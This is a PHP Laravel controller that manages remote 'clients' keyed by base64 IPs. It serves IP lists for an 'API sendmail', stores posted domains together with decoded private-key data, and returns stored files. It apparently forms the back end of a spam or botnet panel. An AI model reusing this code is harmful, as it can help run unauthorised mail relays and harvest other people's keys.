<?php

namespace App\Http\Controllers;

use App;
use App\Client;
use App\ClientsCache;
use App\Helper;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;

class Clients extends Controller
{
    public function index()
    {
        return view('clients.list');
    }

    /*
     * API sendmail
     * */
    public function setClientIp($base64, Request $request)
    {
        if ($request->ip() == '127.0.0.1' || $request->ip() == 'localhost') {
            $client = Helper::getClient();
            $client->addTaskHighBackground("api:client:new", $base64);
            $client->runTasks();
        } else {
            abort(404);
        }
    }

    public function getBlackList(Request $request)
    {
        if ($request->ip() == '127.0.0.1' || $request->ip() == 'localhost') {
            return response()->json(
                App\Blacklist::where('valid', false)
                    ->get()
                    ->pluck('base64')
            );
        } else {
            abort(404);
        }
    }

    public function getWhiteList(Request $request)
    {
        if ($request->ip() == '127.0.0.1' || $request->ip() == 'localhost') {
            return response()->json(
                App\Whitelist::all()->pluck('base64')
            );
        } else {
            abort(404);
        }
    }

    /*
     * API sendmail2
     */
    public function getClientIp()
    {
        $clients = array_keys(Client::getOnline());
        // todo
        $clients = array_merge($clients, Client::take(200)->pluck('base64')->toArray());
        $blacklist = App\Blacklist::where('valid', true)
            ->pluck('base64')
            ->toArray();

        shuffle($clients);
        foreach ($clients as $client) {
            $ip = Client::validIP($client);

            if ($ip && in_array($client, $blacklist) && Client::isValid($client) && !Client::getDomain($client)) {
                return $ip;
            }
        }
    }

    public function getClientIpAll()
    {
        $clients = array_keys(Client::getOnline());
        // todo
        $clients = array_merge($clients, Client::take(200)->pluck('base64')->toArray());
        $blacklist = App\Blacklist::where('valid', true)
            ->pluck('base64')
            ->toArray();

        $result = [];
        foreach ($clients as $client) {
            $ip = Client::validIP($client);

            if ($ip && in_array($client, $blacklist) && Client::isValid($client) && !Client::getDomain($client)) {
                $result[] = $ip;
            }
        }
        return implode("\r\n", $result);
    }


    // TODO don't know os and base64
    public function setClientInfo(Request $request)
    {
        ini_set('max_execution_time', 300);
        $post = $request->all();

        if (isset($post['ip']) && isset($post['domain']) && isset($post['priv'])) {
            $file = $post['domain'];
            $file .= "\r\n";
            $file .= "\r\n";
            $file .= 'default';
            $file .= "\r\n";
            $file .= "\r\n";
            $file .= base64_decode($post['priv']);

            $searchdb = Client::where('base64', 'LIKE', preg_replace('#\=#', '', base64_encode($post['ip'])).'%')->pluck('base64')->toArray();
            if (!empty($searchdb)) {
                $base64_empty = true;
                foreach ($searchdb as $b) {
                    $path = $b[0].$b[1].'/'.$b[2].$b[3].'/'.$b[4].$b[5].'/'.substr($b, 6);
                    if (!Storage::disk('client_data')->exists($path)) {
                        Storage::disk('client_data')->put($path, $file);
                        Client::where('base64', $b)->delete(); // todo
                        $base64_empty = false;
                        break;
                    }
                }
                if ($base64_empty) {
                    abort(400);
                }
            } else {
                $online = array_keys(Client::getOnline());
                $base64 = preg_grep('#' . preg_replace('#\=#', '', base64_encode($post['ip'])) . '#', $online);
                if (!empty($base64)) {
                    $base64_empty = true;
                    foreach ($base64 as $b) {
                        $path = $b[0] . $b[1] . '/' . $b[2] . $b[3] . '/' . $b[4] . $b[5] . '/' . substr($b, 6);
                        if (!Storage::disk('client_data')->exists($path)) {
                            Storage::disk('client_data')->put($path, $file);
                            Client::where('base64', $b)->delete(); // todo
                            $base64_empty = false;
                            break;
                        }
                    }
                    if ($base64_empty) {
                        abort(400);
                    }
                } else {
                    $cache = ClientsCache::where('base64', 'like', '%' . $post['ip'] . '%')->get()->toArray();
                    if (!empty($cache)) {
                        $cache_empty = true;
                        foreach ($cache as $b) {
                            $b = $b['base64'];
                            $path = $b[0] . $b[1] . '/' . $b[2] . $b[3] . '/' . $b[4] . $b[5] . '/' . substr($b, 6);
                            if (!Storage::disk('client_data')->exists($path)) {
                                Storage::disk('client_data')->put($path, $file);
                                Client::where('base64', $b)->delete(); // todo
                                $cache_empty = false;
                                break;
                            }
                        }
                        if ($cache_empty) {
                            abort(400);
                        }
                    } else {
                        abort(400);
                    }
                }
            }
        } else {
            abort(403);
        }
    }

    // get file
    public function getFile(Request $request)
    {
        $data = \json_decode($request->getContent(), true);
        if (!empty($data['id'])) {
            if ((int)$data['id'] < 1) {
                $test = @base64_decode($data['id']);
                $test = (int)$test;
                if ($test > 0) {
                    $data['id'] = $test;
                }
            }
        }

            
        // FOR FILE
        if (!empty($data['id']) && !empty($data['fileID']) && Storage::disk('data')->exists($data['id'] . '/body')) {
            $id = $data['id'];
            $fileID = $data['fileID'];

            $groups = \json_decode(Storage::disk('data')->read($id . '/body'), true)['groups'];

            foreach ($groups as $group) {
                foreach ($group['files'] as $file) {
                    if ($file['id'] == $fileID && Storage::exists($id . '/' . $file['name'])) {
                        $result = [
                            'name' => $file['name'],
                            'file' => base64_encode(Storage::read($id . '/' . $file['name']))
                        ];
                        return response()->json($result);
                    }
                }
            };
        }

        // FOR GROUP
        if (!empty($data['id']) && !empty($data['groupID']) && Storage::disk('data')->exists($data['id'] . '/body')) {
            $id = $data['id'];
            $groupID = $data['groupID'];

            $groups = \json_decode(Storage::disk('data')->read($id . '/body'), true)['groups'];

            foreach ($groups as $group) {
                if ($group['id'] == $groupID) {
                    $result = ['files' => []];
                    foreach ($group['files'] as $file) {
                        if (Storage::exists($id . '/' . $file['name'])) {
                            $result['files'][] = [
                                'name' => $file['name'],
                                'file' => base64_encode(Storage::read($id . '/' . $file['name']))
                            ];
                        }
                    }

                    return response()->json($result);
                }
            };
        }

        return response('Not found', 404);
    }
}
